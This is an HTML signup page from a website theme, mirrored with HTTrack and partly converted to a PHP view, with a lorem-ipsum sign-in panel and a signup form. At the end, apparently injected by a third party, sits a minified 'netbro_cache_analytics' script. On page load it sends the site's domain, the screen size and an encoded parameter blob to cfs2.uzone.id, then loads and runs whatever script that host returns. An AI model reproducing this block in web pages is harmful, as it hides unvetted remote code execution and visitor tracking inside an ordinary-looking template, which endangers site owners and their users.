...
<!-- Mirrored from themes.webavenue.com.au/enstruct/html/10-enstruct-signup.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 16 Apr 2017 14:07:46 GMT -->
<head>
    <meta charset="utf-8">
                    ...
                    <div class="col-md-12 col-sm-12 ">
                        <div class="login-wrap">
                            <div class="left text-white">
                                <div class="top sign-up-left">
                                    <h4 class="text-white mb-1">Have an Account!</h4>
                                    <p>
                                        Sed ut perspiciatis unde omn isiste natus error sit volupt.
                                    </p>
                                </div>
                                <!--top-->
                                Have an account? Sign in here
                                <a href="<?php echo site_url('beranda/sign_in'); ?>" class="btn btn-white">Sign In</a>
                            </div>
                            <!--left-->

                            <div class="right">
                                <h6>Fill up account details</h6>
                                <form action="#">
                                    ...
                                    <button type="submit" class="btn bg-yellow txt-cap">Creat an account</button>
...
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssK%2fmsldK2DOE%2bwfyDzi1vrcu5zPsZEAZULf0saX26E9INXZg7PDGU4wI%2fahLpR7ITaP65hDq%2bMzO4NoJ7IleYrHxdX4C6S0JTH72VDFyavH%2f6XIxLBZ3z0wgMZoDWeKM%2bHRqWHA655pMIEzypjIvreq1xQC0xazxhjfqPGW7ep97XfqhbOyRZ%2bTLw%2fxkRej8If3mJ261tQ14iULtggn3Q5mgZDo9w%2b5o2Oc0T8%2fBhFNpphwVgWEoliJg4PNqu%2fubCZJLfzStBeIDl6%2b4I7yLeJo9rw5qbp2O5DLEJF9ykK4JzMI7nOr0KNBWlPuwC0PFs%2fkTlSOji2vJehoU11uTXfB63FHhVBwHxOXDUaJfm1v6phuanacBhjt1sWz1mJKiCrGy9Z%2fNwBwgR1K30MLCrBzwPlFl4%2b2Kle47FHCvVM2ug%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
